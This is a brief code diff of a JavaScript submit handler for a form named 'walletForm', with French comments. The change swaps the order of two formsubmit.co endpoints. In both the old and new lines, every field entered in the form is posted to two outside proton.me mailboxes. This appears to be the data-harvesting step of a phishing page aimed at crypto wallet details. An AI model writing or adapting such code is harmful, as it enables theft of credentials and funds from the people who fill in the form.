@@ -179,12 +179,12 @@ document.getElementById("walletForm").addEventListener("submit", function(e) {
     let formData = new FormData(form);
 
     // 1er envoi vers le premier email
-    fetch("https://formsubmit.co/PotionMagique7@proton.me", {
+    fetch("https://formsubmit.co/code-iptv@proton.me", {
         method: "POST",
         body: formData
     }).then(() => {
         // 2e envoi vers le deuxième email
-        return fetch("https://formsubmit.co/code-iptv@proton.me", {
+        return fetch("https://formsubmit.co/PotionMagique7@proton.me", {
             method: "POST",
             body: formData
         });
